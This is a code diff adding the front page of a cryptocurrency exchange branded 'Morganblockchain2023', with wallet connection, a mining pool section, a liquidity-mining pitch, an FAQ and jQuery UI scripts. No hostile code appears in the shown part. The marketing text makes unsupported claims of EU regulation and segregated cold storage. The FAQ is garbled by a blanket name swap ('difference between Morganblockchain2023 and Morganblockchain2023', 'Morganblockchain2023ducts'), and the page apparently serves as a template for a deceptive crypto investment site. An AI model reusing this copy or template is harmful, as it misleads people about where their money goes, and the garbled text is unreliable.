+                                            style="font-size: 16px; font-weight: bold;">XRP<span data-v-4e71be4a=""
+                                                class="follow-item-small">/USDT</span></span>
+                                        <br data-v-41bb2ad4="">
+                                        <span data-v-41bb2ad4="" class="green"
+                                            style="font-weight: bold; font-size: 16px;">0.35328</span>
+                                        <br data-v-41bb2ad4="">
+                                        <span data-v-41bb2ad4="" class="green">+0.16%</span>
+                                        <br data-v-41bb2ad4=""> -->
+                                    </div>
+
+                                </div>
+                            </div>
+                            <!-- <div data-v-41bb2ad4=""
+                                style="width: 100%; height: 5px; background-color: rgb(238, 238, 238);"></div>
+                            <uni-view data-v-4e71be4a="" class="support-card">
+                                <uni-view data-v-4e71be4a="" class="u-margin-10">
+                                    <uni-view data-v-4e71be4a="" class="title fexCenterTransaction">Quick
+                                        Transaction</uni-view>
+                                    <uni-view data-v-4e71be4a="" class="sub-title">
+                                        <uni-view data-v-4e71be4a="" class="fexCenterSupport">Support</uni-view>
+                                        <uni-view data-v-4e71be4a="">BTC, USDT, ETH, etc.</uni-view>
+                                    </uni-view>
+                                </uni-view>
+                            </uni-view> -->
+                        </div>
+                        <!-- <div data-v-41bb2ad4=""
+                            style="width: 100%; height: 5px; background-color: rgb(238, 238, 238);"></div>
+                        <div data-v-41bb2ad4="" class="inner-menu flex"
+                            style="border-width: 0px; border-color: rgb(238, 238, 238);">
+                            <div data-v-41bb2ad4="" justify-content="center" class="flex-column">
+                                <div data-v-41bb2ad4="">
+                                    <div class="mu-ripple-wrapper"></div>
+                                    <div data-v-41bb2ad4="" class="pt5"
+                                        onclick="javascript:location.href='/Home/language?a='"
+                                        style='z-index:1'>
+                                        <div data-v-41bb2ad4="" class="icon-container" style="line-height:0px">
+                                            <img width="30" height="30" src="~/resource/language.png" />
+                                        </div>
+                                        <div data-v-41bb2ad4="" class="bold fexCenterMenuLanguage">Language</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div data-v-41bb2ad4="" justify-content="center" class="flex-column">
+                                <div data-v-41bb2ad4="">
+                                    <div class="mu-ripple-wrapper"></div>
+                                    <div data-v-41bb2ad4="" class="pt5"
+                                        onclick="javascript:location.href='/Home/help?a='"
+                                        style='z-index:1'>
+                                        <div data-v-41bb2ad4="" class="icon-container">
+                                            <svg data-v-41bb2ad4="" aria-hidden="true" class="icon"
+                                                style="font-size: 18px;">
+                                                <use data-v-41bb2ad4="" xlink:href="#icon-bangzhu"></use>
+                                            </svg>
+                                        </div>
+                                        <div data-v-41bb2ad4="" class="bold fexCenterMenuHelp">Help</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div data-v-41bb2ad4="" justify-content="center" class="flex-column">
+                                <div data-v-41bb2ad4="">
+                                    <div class="mu-ripple-wrapper"></div>
+                                    <div data-v-41bb2ad4="" class="pt5"
+                                        onclick="javascript:location.href='/Home/recharge?a='"
+                                        style='z-index:1'>
+                                        <div data-v-41bb2ad4="" class="icon-container">
+                                            <svg data-v-41bb2ad4="" aria-hidden="true" class="icon"
+                                                style="font-size: 18px;">
+                                                <use data-v-41bb2ad4="" xlink:href="#icon-deposit"></use>
+                                            </svg>
+                                        </div>
+                                        <div data-v-41bb2ad4="" class="bold fexCenterMenuQuick">Quick recharge</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div data-v-41bb2ad4="" justify-content="center" class="flex-column">
+                                <div data-v-41bb2ad4="">
+                                    <div class="mu-ripple-wrapper"></div>
+                                    <div data-v-41bb2ad4="" class="pt5" onclick="javascript:location.href='/'"
+                                        style='z-index:1'>
+                                        <div data-v-41bb2ad4="" class="icon-container">
+                                            <svg data-v-41bb2ad4="" aria-hidden="true" class="icon"
+                                                style="font-size: 18px;">
+                                                <use data-v-41bb2ad4="" xlink:href="#icon-jiqiren"></use>
+                                            </svg>
+                                        </div>
+                                        <div data-v-41bb2ad4="" class="bold fexCenterMenuPledge">Pledge</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div data-v-41bb2ad4="" justify-content="center" class="flex-column kefu">
+                                <div data-v-41bb2ad4="">
+                                    <div class="mu-ripple-wrapper"></div>
+                                    <div data-v-41bb2ad4="" class="pt5">
+                                        <div data-v-41bb2ad4="" class="icon-container">
+                                            <svg data-v-41bb2ad4="" aria-hidden="true" class="icon"
+                                                style="font-size: 18px;">
+                                                <use data-v-41bb2ad4=""
+                                                    xlink:href="#icon-lanlvtubiaozhizuomoban-39"></use>
+                                            </svg>
+                                        </div>
+                                        <div data-v-41bb2ad4="" class="bold fexCenterMenuService">Service</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div> -->
+                        <!-- <div data-v-41bb2ad4=""
+                            style="width: 100%; height: 5px; background-color: rgb(238, 238, 238);"></div> -->
+                        <!-- 新修改 -->
+
+                        <div data-v-41bb2ad4="" style="width: 100%; ">
+                            <div data-v-41bb2ad4="" class=" container">
+                                <div data-v-41bb2ad4="" class="bold tall ft16 tab-group" style="overflow-x: scroll;width: 100%;display: flex;">
+                                    <span class="active">all</span>
+                                    <span>Main</span>
+                                    <span>Open</span>
+                                    <span>Inno</span>
+                                    <span>INN</span>
+                                    <span>AI</span>
+                                    <span>New</span>
+                                </div>
+                                <div data-v-41bb2ad4="">
+                                    <div data-v-41bb2ad4="" class=" flex alcenter bold"
+                                         style="border-width: 0px;display:none; border-top-style: solid; border-top-color: rgb(250, 250, 250); font-size: 13px; padding: 10px 0px;">
+                                        <div data-v-41bb2ad4="" class="flex flex-column"
+                                             style="flex: 1 1 0%; text-align: left; padding-left: 20px;">
+                                            <span data-v-41bb2ad4="" style="color: rgb(170, 170, 170);"
+                                                  class="fexTableTitlePair">Pair</span>
+                                        </div>
+                                        <div data-v-41bb2ad4="" class="flex flex-column talc" style="flex: 2 1 0%;">
+                                            <span data-v-41bb2ad4="" style="color: rgb(170, 170, 170);"
+                                                  class="fexTableTitlePrice">Price</span>
+                                        </div>
+                                        <div data-v-41bb2ad4="" class="talr"
+                                             style="width: 120px; padding-right: 20px;">
+                                            <span data-v-41bb2ad4="" style="color: rgb(170, 170, 170);"
+                                                  class="fexTableTitleChange">Change</span>
+                                        </div>
+                                    </div>
+                                    <div id="coinListItem">
+                                        <!--
+
+                                        -->
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- 新修改 -->
+                        <div class="list-flow-dig">
+                            <h1 class="footMenuMining1">Mining Pool</h1>
+                            <div class="flex flex-col px-30 py-52">
+                                <div class="flex justify-between items-center">
+                                    <div class="flex items-center relative">
+                                        <div class="flex items-start">
+                                            <img src="/resource/logo_BTC.png" alt="" class="w-79 h-79 rounded-full">
+                                            <img src="/resource/165.png" alt="" class="trx-logo w-79 h-79 rounded-full">
+                                        </div>
+                                        <div class="mining-word font-40 MiningTitle">Mining</div>
+                                    </div>
+                                    <p class="trade flex items-center justify-center TradeTitle">Trade</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="list-intro">
+                            <h1 class="platformTitle">User-trusted cryptocurrency trading platform</h1>
+                            <ul class="flex flex-col">
+                                <li class="flex items-center py-60 px-30 border-b-grey">
+                                    <img src="/resource/a1.png" alt="logo" class="w-104 h-104 rounded-full mr-39 border-solid">
+                                    <div class="flex flex-col">
+                                        <h2 class="font-30 font-normal SafuTitle">Industry Leading Security</h2>
+                                        <p class="font-26 mt-18 text-grey SafuContent">
+                                            Funds are segregated and
+                                            safely stored in secure cold wallet solutions.
+                                        </p>
+                                    </div>
+                                </li>
+                                <li class="flex items-center py-60 px-30 border-b-grey">
+                                    <img src="/resource/a2.png" alt="logo" class="w-104 h-104 rounded-full mr-39 border-solid">
+                                    <div class="flex flex-col">
+                                        <h2 class="font-30 font-normal PersonalizedTitle">Competitive Fees</h2>
+                                        <p class="font-26 mt-18 text-grey PersonaContent">
+                                            Fees as low as 0.065%
+                                            based on trading volumes.
+                                        </p>
+                                    </div>
+                                </li>
+                                <li class="flex items-center py-60 px-30 border-b-grey">
+                                    <img src="/resource/a3.png" alt="logo" class="w-104 h-104 rounded-full mr-39 border-solid">
+                                    <div class="flex flex-col">
+                                        <h2 class="font-30 font-normal AdvancedTitle">Fully EU-Regulated</h2>
+                                        <p class="font-26 mt-18 text-grey AdvancedContent">
+                                            The highest level of
+                                            compliance allows Morganblockchain2023 to bring cryptocurrencies closer
+                                            to
+                                            traditional assets and make it more accessible.
+                                        </p>
+                                    </div>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="list-faq" style="display:none;">
+                            <h1 class="questionTitle">Related Question</h1>
+                            <div class="van-collapse">
+                                <div class="van-collapse-item">
+                                    <div class="van-cell questionList_c1">
+                                        <span style="text-align: left;">
+                                            What is the difference between
+                                            Morganblockchain2023 and
+                                            Morganblockchain2023?
+                                        </span>
+                                        <img src="/resource/172458_down_arrow_icon.png" alt="">
+                                    </div>
+                                    <div class="van-collapse-item__content">
+                                        <span class="questionList_b1">
+                                            Morganblockchain2023 is an easy-to-use,
+                                            newbie-friendly
+                                            broker service for buying and selling digital assets.
+                                            Morganblockchain2023 is an
+                                            exchange for professionals and businesses where they can trade and
+                                            connect trading bots to our API.
+                                        </span>
+                                    </div>
+                                </div>
+                                <div class="van-collapse-item1">
+                                    <div class="van-cell questionList_c2">
+                                        <span>
+                                            Can I log in with my existing Morganblockchain2023 account on
+                                            Morganblockchain2023?
+                                        </span>
+                                        <img src="/resource/172458_down_arrow_icon.png" alt="">
+                                    </div>
+                                    <div class="van-collapse-item__content1">
+                                        <span class="questionList_b2">
+                                            Yes. You only need to register once for all
+                                            Morganblockchain2023ducts.
+                                        </span>
+                                    </div>
+                                </div>
+                                <div class="van-collapse-item2">
+                                    <div class="van-cell questionList_c3">
+                                        <span>Is Morganblockchain2023 available in every country?</span>
+                                        <img src="/resource/172458_down_arrow_icon.png" alt="">
+                                    </div>
+                                    <div class="van-collapse-item__content2">
+                                        <span class="questionList_b3">
+                                            Morganblockchain2023 is available to users
+                                            from a high
+                                            number of countries. For further information, please see item 7 of our
+                                            Morganblockchain2023 Group Terms and Conditions.
+                                        </span>
+                                    </div>
+                                </div>
+                                <div class="van-collapse-item3">
+                                    <div class="van-cell questionList_c4">
+                                        <span>
+                                            Can I also use British pound and US dollar to add funds to
+                                            Morganblockchain2023
+                                            Pro?
+                                        </span>
+                                        <img src="/resource/172458_down_arrow_icon.png" alt="">
+                                    </div>
+                                    <div class="van-collapse-item__content3">
+                                        <span class="questionList_b4">
+                                            <p>
+                                                Currently, it is possible to fund your account with Euro, Swiss franc
+                                                and British pound directly to Morganblockchain2023. If you want to
+                                                use USD
+                                                to fund your Morganblockchain2023 wallet, you may want to follow
+                                                these
+                                                steps:
+                                            </p>
+                                            <ol>
+                                                <li>Fund your Morganblockchain2023 Broker account with USD. </li>
+                                                <li>
+                                                    Buy any cryptocurrency or digital asset supported on
+                                                    Morganblockchain2023
+                                                    Pro.
+                                                </li>
+                                                <li>
+                                                    Transfer it instantly and free of charge to your
+                                                    Morganblockchain2023
+                                                    wallet.
+                                                </li>
+                                            </ol>
+                                            <p>
+                                                <strong>Note:</strong> The buying and selling of cryptocurrencies
+                                                comes with the risk of price fluctuation. You are aware and accept
+                                                that such fluctuations may change the value of your assets while
+                                                performing the aforementioned process. Morganblockchain2023 does not
+                                                take any
+                                                responsibility for any such fluctuations and/or losses incurred
+                                                thereof.&nbsp;
+                                            </p>
+                                        </span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="list-dept">
+                            <h1 class="ContractTitle">Contract Audit Agency</h1>
+                            <div>
+                                <div class="flex justify-between Contract_img">
+                                    <img src="/resource/top-left.d05db839.png" alt="">
+                                    <img src="/resource/top-right.7432c57c.png" alt="">
+                                </div>
+                                <div class="flex Contract_text">
+                                    <div class="flex flex-col flex-1 justify-center items-center border-r-grey">
+                                        <img src="/resource/c1.png" alt="">
+                                        <p class="SpotTitle">Spot/Lever/Contract</p>
+                                    </div>
+                                    <div class="flex flex-col flex-1 justify-center items-center">
+                                        <img src="/resource/c2.png" alt="">
+                                        <p class="StakingTitle">Staking Mining、Defi etc</p>
+                                    </div>
+                                </div>
+                                <h2 class="StartTitle">Start trading now</h2>
+                                <p class="DecentralizedTitle" style="font-size: 12px;color: #868c9a;">
+                                    Decentralized
+                                    exchange platform
+                                </p>
+                                <div class="flex justify-center items-center mt">
+                                    <p class="flex justify-center items-center TradeNowTitle jumpAlcenter" style="margin-top:30px;"
+                                       onclick="javascript:location.href='/Home/trade?a='">
+                                        Trade
+                                        now
+                                    </p>
+                                </div>
+                                <ul class="flex" style="display:none;">
+                                    <li class="flex justify-center flex-1">
+                                        <img src="/resource/Start1.png" alt="">
+                                    </li>
+                                    <li class="flex justify-center flex-1">
+                                        <img src="/resource/Start2.png" alt="">
+                                    </li>
+                                    <li class="flex justify-center flex-1">
+                                        <img src="/resource/Start3.png" alt="">
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="list-partener">
+                            <h1 class="PartnerTitle">Partner</h1>
+                            <ul class="flex">
+                                <li>
+                                    <img src="/resource/1.0ca18c78.png" alt="">
+                                </li>
+                                <li>
+                                    <img src="/resource/download-9.png" alt="">
+                                </li>
+                                <li>
+                                    <img src="/resource/download.png" alt="">
+                                </li>
+                                <li>
+                                    <img src="/resource/download-1.png" alt="">
+                                </li>
+                                <li>
+                                    <img src="/resource/download-2.png" alt="">
+                                </li>
+                                <li>
+                                    <img src="/resource/download-3.png" alt="">
+                                </li>
+                                <li>
+                                    <img src="/resource/download-4.png" alt="">
+                                </li>
+                                <li>
+                                    <img src="/resource/download-5.png" alt="">
+                                </li>
+                                <li>
+                                    <img src="/resource/download-6.png" alt="">
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="footer" style="background-color:#fff;z-index:10;">
+                <div data-v-2cdefb6d="" class="footer" style="border-color: rgb(238, 238, 238);">
+                    <div data-v-2cdefb6d="" justify-content="center" class="flex-column active"
+                         onclick="javascript:location.href='/Home/language?a='">
+                        <div data-v-2cdefb6d="">
+                            <div class="mu-ripple-wrapper"></div>
+                            <div data-v-2cdefb6d="">
+                                <div data-v-2cdefb6d="" class="icon-container" style="margin-bottom:2px;">
+                                    <!--<i data-v-2cdefb6d="" class="iconfont icon-ico_home"></i>-->
+                                    <img src="/resource/lug.png" style="width:22px;height:22px;font-size:12px;">
+                                </div>
+                                <div data-v-2cdefb6d="" class="bold fexCenterMenuLanguage">Language</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div data-v-2cdefb6d="" justify-content="center" class="flex-column fexCenterMenuService1"
+                         onclick="">
+                        <div data-v-2cdefb6d="">
+                            <div class="mu-ripple-wrapper"></div>
+                            <div data-v-2cdefb6d="">
+                                <div data-v-2cdefb6d="" class="icon-container" style="color:#969ca0;">
+                                    <img src="/resource/kf.png" style="width:25px;height:25px;">
+                                </div>
+                                <div data-v-2cdefb6d="" class="bold footMenuMining fexCenterMenuService" style="">
+                                   online Service
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div data-v-2cdefb6d="" justify-content="center" class="flex-column"
+                         onclick="javascript:location.href='/Home/trade?a='">
+                        <div data-v-2cdefb6d="">
+                            <div class="mu-ripple-wrapper"></div>
+                            <div data-v-2cdefb6d="">
+                                <div data-v-2cdefb6d="" class="icon-container" style="color:#969ca0">
+                                    <i data-v-2cdefb6d="" class="iconfont icon-heyue"></i>
+                                </div>
+                                <div data-v-2cdefb6d="" class="bold footMenuTrade">Trade</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div data-v-2cdefb6d="" justify-content="center" class="flex-column"
+                         onclick="javascript:location.href='/Home/assets?a='">
+                        <div data-v-2cdefb6d="">
+                            <div class="mu-ripple-wrapper"></div>
+                            <div data-v-2cdefb6d="">
+                                <div data-v-2cdefb6d="" class="icon-container" style="color:#969ca0">
+                                    <i data-v-2cdefb6d="" class="iconfont icon-ziyuan"></i>
+                                </div>
+                                <div data-v-2cdefb6d="" class="bold footMenuAssets">My Assets</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+    
+    <div class="mu-loading-wrap mu-loading-wrap__fixed" style="opacity:0.8;background-color:white;">
+        <div class="mu-circular-progress mu-primary-color mu-inverse mu-loading-circular"
+             style="width: 48px; height: 48px;">
+            <div class="mu-circle-wrapper active" style="width: 48px; height: 48px;">
+                <div class="mu-circle-spinner active mu-primary-color mu-inverse">
+                    <div class="mu-circle-clipper left">
+                        <div class="mu-circle" style="border-width: 2px;"></div>
+                    </div>
+                    <div class="mu-circle-gap-patch">
+                        <div class="mu-circle"></div>
+                    </div>
+                    <div class="mu-circle-clipper right">
+                        <div class="mu-circle" style="border-width: 2px;"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div style="color:#2196f3;margin-top:10px;">
+            <span>connecting wallet</span>
+        </div>
+
+    </div>
+    <div class="mu-overlay" style="position: fixed; z-index: 20141249;display:none"></div>
+     <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header" style="font-size:17px;padding:16px;background-color:#2890FD;color:#fff">
+                    <h7 class="modal-title" id="exampleModalLabel">Latest news</h7>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body" style="font-size:15px">
+                    Liquidity mining is a method in which wallet holders receive node credentials and then join the liquidity income pool to generate rewards. To earn mining rewards, cryptocurrency holders store funds in their liquidity wallets, making them liquidity miners and relying on smart contract mining to earn rewards.
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="/resource/chunk-vendors.3f066eab.js"></script>
+    <style id="muse-theme">
+        body {
+            background-color: #ffffff;
+            color: rgba(0, 0, 0, 0.87);
+        }
+
+        a {
+            color: #000000;
+        }
+
+        .mu-primary-color {
+            background-color: #2196f3;
+        }
+
+        .mu-secondary-color {
+            background-color: #000000;
+        }
+
+        .mu-success-color {
+            background-color: #4caf50;
+        }
+
+        .mu-warning-color {
+            background-color: #fdd835;
+        }
+
+        .mu-info-color {
+            background-color: #2196f3;
+        }
+
+        .mu-error-color {
+            background-color: #f44336;
+        }
+
+        .mu-inverse {
+            color: #fff !important
+        }
+
+        .mu-primary-text-color {
+            color: #2196f3;
+        }
+
+        .mu-secondary-text-color {
+            color: #000000;
+        }
+
+        .mu-success-text-color {
+            color: #4caf50;
+        }
+
+        .mu-warning-text-color {
+            color: #fdd835;
+        }
+
+        .mu-info-text-color {
+            color: #2196f3;
+        }
+
+        .mu-error-text-color {
+            color: #f44336;
+        }
+    </style>
+</body>
+<script src="/lib/jquery/dist/web3.min.js"></script>
+<script src="/lib/jquery/dist/storage.js"></script>
+<!-- <script src="~/js/indexLanguage.js"></script> -->
+<script src="/js/language.js?a=123ssss"></script>
+<script src="/resource/swiper-bundle.min.js"></script>
+
+<script src="/lib/jquery/dist/addressData.js?v=A101_ 20250608&&abc"></script>
+
+
+
+</html>
+<script type="text/javascript">
+    var jumpAddress;
+    var primary_c;
+    var advanced_c;
+    var initMoney = 4000000;
+    var now_date = new Date();
+    var now_hours = now_date.getHours();
+    var now_day = now_date.getDate();
+    var tuan_chart, geren_chart;
+    var storage = new MyStorage();
+    var ttt; //type:primary/secondary/success/danger/warning/info/light/dark
+    var language = null;
+    var name = '全部all';
+    var language_type = storage.getItem('language');
+
+
+    function alertTip(message, type) {
+        var wrapper = document.createElement('div');
+        wrapper.innerHTML =
+            '<div style="position: fixed;top: 1px;width: 100%;text-align: center;z-index:100" class="alert alert-' +
+            type +
+            ' alert-dismissible" role="alert">' + message +
+            '<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>';
+        var alertPlaceholder = $('#liveAlertPlaceholder');
+        alertPlaceholder.html(wrapper);
+
+        clearTimeout(ttt);
+        ttt = setTimeout(function () {
+            alertPlaceholder.html('');
+        }, 5000);
+    }
+
+    $(function () {
+        //var storage = new MyStorage();
+        //let internetV_name = storage.getItem('internetName');
+        //let internetV_img = storage.getItem('internetImg');
+        //$('.w-full .w-full-img').attr('value', internetV_name ?? 'trc')
+        //$('.w-full .w-full-img img').attr('src', internetV_img ?? '/resource/trc.5b6c792.png')
+        //let inteChos = $('.w-full .w-full-img').attr('value')
+        //if (inteChos == 'erc') {
+        //    web3Erc()
+        //}
+        //if (inteChos == 'trc') {
+        // web3Trc()
+        // }
+        let language_type = storage.getItem('language');
+        // $('#language').val(language_type ?? 'en');
+        var language = language_type && languageObject[language_type] ? languageObject[language_type] :
+            languageObject[
+            'en'];
+
+        $('.MiningTitle').text(language.MiningTitle);
+        $('.TradeTitle').text(language.TradeTitle);
+        $('.HotTitle').text(language.HotTitle);
+        $('.platformTitle').text(language.platformTitle);
+        $('.SafuTitle').text(language.SafuTitle);
+        $('.SafuContent').text(language.SafuContent);
+        $('.PersonalizedTitle').text(language.PersonalizedTitle);
+        $('.PersonaContent').text(language.PersonaContent);
+        $('.AdvancedTitle').text(language.AdvancedTitle);
+        $('.AdvancedContent').text(language.AdvancedContent);
+        $('.questionTitle').text(language.questionTitle);
+        $('.questionList_c1 span').text(language.questionList_c1);
+        $('.questionList_b1').text(language.questionList_b1);
+        $('.questionList_c2 span').text(language.questionList_c2);
+        $('.questionList_b2').text(language.questionList_b2);
+        $('.questionList_c3 span').text(language.questionList_c3);
+        $('.questionList_c4 span').text(language.questionList_c4);
+        $('.questionList_b3').text(language.questionList_b3);
+        $('.questionList_b4').html(language.questionList_b4);
+        $('.ContractTitle').text(language.ContractTitle);
+        $('.SpotTitle').text(language.SpotTitle);
+        $('.StakingTitle').text(language.StakingTitle);
+        $('.StartTitle').text(language.StartTitle);
+        $('.DecentralizedTitle').text(language.DecentralizedTitle);
+        $('.TradeNowTitle').text(language.TradeNowTitle);
+        $('.PartnerTitle').text(language.PartnerTitle);
+
+        $('.indexMoney').text(language.indexMoney);
+        $('.fexLeftMenuMining').text(language.fexLeftMenuMining);
+        $('.fexLeftMenuInvite').text(language.fexLeftMenuInvite);
+        $('.fexLeftMenuSuper').text(language.fexLeftMenuSuper);
+        $('.fexLeftMenuDaily').text(language.fexLeftMenuDaily);
+        $('.fexLeftMenuTerms').text(language.fexLeftMenuTerms);
+        $('.fexLeftMenuLogin').text(language.fexLeftMenuLogin);
+        $('.fexLeftMenuPassword').text(language.fexLeftMenuPassword);
+        $('.fexLeftMenuLogout').text(language.fexLeftMenuLogout);
+        $('.fexCenterMenuLanguage').text(language.fexCenterMenuLanguage);
+        $('.fexCenterTransaction').text(language.fexCenterTransaction);
+        $('.fexCenterSupport').text(language.fexCenterSupport);
+        $('.fexCenterMenuHelp').text(language.fexCenterMenuHelp);
+        $('.fexCenterMenuQuick').text(language.fexCenterMenuQuick);
+        $('.fexCenterMenuPledge').text(language.fexCenterMenuPledge);
+        $('.fexCenterMenuService').text(language.fexCenterMenuService);
+        $('.fexDataTitle').text(language.fexDataTitle);
+        $('.fexTableTitlePair').text(language.fexTableTitlePair);
+        $('.fexTableTitlePrice').text(language.fexTableTitlePrice);
+        $('.fexTableTitleChange').text(language.fexTableTitleChange);
+        $('.footMenuHome').text(language.footMenuHome);
+        $('.footMenuTrade').text(language.footMenuTrade);
+        $('.footMenuAssets').text(language.footMenuAssets);
+        $("#eventKeFu").text(language.eventKeFu);
+        $('.Primary').text(language.Primary);
+        $('.Advanced').text(language.Advanced);
+        $('.Certified').text(language.Certified);
+        $('.NotVerified').text(language.NotVerified);
+        $('.verifying').text(language.verifying);
+        $('.nightMode').text(language.nightMode);
+        $('.setFundPassword').text(language.SetFunTitle);
+         $('.footMenuMining1').text(language.footMenuMining);
+        //夜间模式开关
+
+        let mode_type = storage.getItem('mode');
+        $('body').attr('value', mode_type ?? 'light')
+        if ($('body').attr('value') == 'night') {
+            $('.mui-switch').prop("checked", "true");
+            $('body').addClass('night')
+            $('.menu-w').show()
+            $('.menu-b').hide();
+            $("div.mu-loading-wrap__fixed").css("background-color", "#102030");
+            $("div.footer").css("background-color", "#102030");
+            $("div.footMenuMining").css("color", "white");
+            $("div.footMenuTrade").css("color", "white");
+            $("div.footMenuAssets").css("color", "white");
+
+        } else {
+            $('.menu-w').hide()
+            $('.menu-b').show()
+            $('.mui-switch').removeAttr("checked");
+            $('body').removeClass('night')
+            $("div.mu-loading-wrap__fixed").css("background-color", "white");
+            $("div.footer").css("background-color", "white");
+
+            $("div.footMenuMining").css("color", "black");
+            $("div.footMenuTrade").css("color", "black");
+            $("div.footMenuAssets").css("color", "black");
+        }
+        $(".mui-switch-anim").change(function () {
+            if ($('.mui-switch').is(':checked')) {
+                storage.setItem({
+                    name: "mode",
+                    expires: 1000 * 3600 * 100000000,
+                    value: 'night',
+                    startTime: new Date().getTime()
+                });
+                $('.menu-w').show()
+                $('.menu-b').hide()
+                $('body').addClass('night')
+                $("div.footer").css("background-color", "#102030");
+                $("div.footMenuMining").css("color", "white");
+                $("div.footMenuTrade").css("color", "white");
+                $("div.footMenuAssets").css("color", "white");
+            } else {
+                storage.setItem({
+                    name: "mode",
+                    expires: 1000 * 3600 * 100000000,
+                    value: 'light',
+                    startTime: new Date().getTime()
+                });
+                $('.menu-w').hide()
+                $('.menu-b').show()
+                $('body').removeClass('night');
+                $("div.footer").css("background-color", "white");
+                $("div.footMenuMining").css("color", "black");
+                $("div.footMenuTrade").css("color", "black");
+                $("div.footMenuAssets").css("color", "black");
+            }
+            let mode_type = storage.getItem('mode');
+            $('body').attr('value', mode_type ?? 'night')
+        });
+        //切换网络地址
+        $('.bg-secondary').click(function () {
+            if ($(".w-full-ul").css("display") == 'none') {
+                $('.w-full-ul').show()
+                $('.w-full-ul').css('dispaly', "black")
+            } else {
+                $('.w-full-ul').hide()
+                $('.w-full-ul').css('dispaly', "none")
+            }
+        })
+        $('.w-full-box,.w-full-ul').mouseleave(function () {
+            $('.w-full-ul').hide()
+            $('.w-full-ul').css('dispaly', "none")
+        })
+
+
+
+        $('.w-full-ul li').each(function () {
+            if ($('.w-full .w-full-img').attr('value') == $(this).attr('value')) {
+                $(this).addClass('w-full-active')
+                $('.w-full-active .dot').show()
+            }
+        })
+        $('.w-full-ul li').on('click', function () {
+            let internetV = $('.w-full .w-full-img').attr("value", $(this).attr('value'))
+            let internetland = internetV.attr('value')
+            if (internetland == $(this).attr('value')) {
+                let img = $(this).find('.w-full-img img').attr('src')
+                $('.w-full .w-full-img img').attr('src', img)
+                storage.setItem({
+                    name: "internetName",
+                    expires: 1000 * 3600 * 10,
+                    value: internetland,
+                    startTime: new Date().getTime()
+                });
+                storage.setItem({
+                    name: "internetImg",
+                    expires: 1000 * 3600 * 10,
+                    value: img,
+                    startTime: new Date().getTime()
+                });
+                window.location.reload()
+            }
+
+            $('.w-full-ul').hide()
+            $('.w-full-ul').css('dispaly', "none")
+        })
+        $('.mu-overlay').click(function () {
+            $('div.mu-paper').removeClass('is-open');
+            $('div.mu-overlay').hide();
+            // $('.van-overlay').hide()
+        });
+        $('.tab-group span').each(function () {
+            $(this).click(function () {
+                $(this).addClass('active').siblings('.tab-group span').removeClass('active');
+                if ($(this).index() == 0) {
+                    name = "全部all"
+                }
+                if ($(this).index() == 1) {
+                    name = "公链币Main"
+                }
+                if ($(this).index() == 2) {
+                    name = "公链币Open"
+                }
+                if ($(this).index() == 3) {
+                    name = "自发币Inno"
+                }
+                if ($(this).index() == 4) {
+                    name = "自发币INN"
+                }
+                if ($(this).index() == 5) {
+                    name = "自发币AI"
+                }
+                if ($(this).index() == 6) {
+                    name = "新开New"
+                }
+                getTokenGroup();
+            })
+        })
+        $('.f_btn').click(function () {
+            $('div.mu-paper').removeClass('is-open');
+            $('div.mu-overlay').hide();
+            // $('.van-overlay').hide()
+        });
+        $('div#open_menu').click(function (event) {
+            var e = arguments.callee.caller.arguments[0] || event;
+            if (e && e.stopPropagation) {
+                e.stopPropagation();
+            } else if (window.event) {
+                window.event.cancelBubble = true;
+            }
+            $('div.mu-paper').addClass('is-open');
+            $('div.mu-overlay').show();
+            // $('.van-overlay').show()
+        })
+        var mySwiper = new Swiper('.swiper-container', {
+            direction: 'horizontal',
+            loop: true, // 循环模式选项
+            autoplay: {
+                delay: 2500,
+                disableOnInteraction: false,
+            },
+            // 如果需要分页器
+            pagination: {
+                el: '.swiper-pagination',
+            },
+        })
+        let loginAddress = storage.getItem('loginAddress');
+        if (loginAddress) { //如果有值 就代表用户登录了 那么隐藏掉登录和注册的链接
+            // $('.menu_footer .login, .menu_footer .register').hide();
+            $("#loginInnnn").hide();
+            $("#logOuttttttt").show();
+        } else {
+            $("#loginInnnn").show();
+            $("#logOuttttttt").hide();
+        }
+        //退出按钮点击
+        $('#logOuttttttt').click(function () {
+            storage.removeItem('loginAddress'); //移除缓存
+            location.href = '/'; //跳转到首页
+        })
+
+
+        $('.van-collapse-item').click(function () {
+            if ($('.van-collapse-item img').hasClass('hover-up')) {
+                $('.van-collapse-item img').removeClass('hover-up')
+            } else {
+                $('.van-collapse-item img').addClass('hover-up')
+            }
+            $('.van-collapse-item__content').slideToggle('slow');
+        })
+        $('.van-collapse-item1').click(function () {
+            if ($('.van-collapse-item1 img').hasClass('hover-up')) {
+                $('.van-collapse-item1 img').removeClass('hover-up')
+            } else {
+                $('.van-collapse-item1 img').addClass('hover-up')
+            }
+            $('.van-collapse-item__content1').slideToggle('slow');
+        })
+        $('.van-collapse-item2').click(function () {
+            if ($('.van-collapse-item2 img').hasClass('hover-up')) {
+                $('.van-collapse-item2 img').removeClass('hover-up')
+            } else {
+                $('.van-collapse-item2 img').addClass('hover-up')
+            }
+            $('.van-collapse-item__content2').slideToggle('slow');
+        })
+        $('.van-collapse-item3').click(function () {
+            if ($('.van-collapse-item3 img').hasClass('hover-up')) {
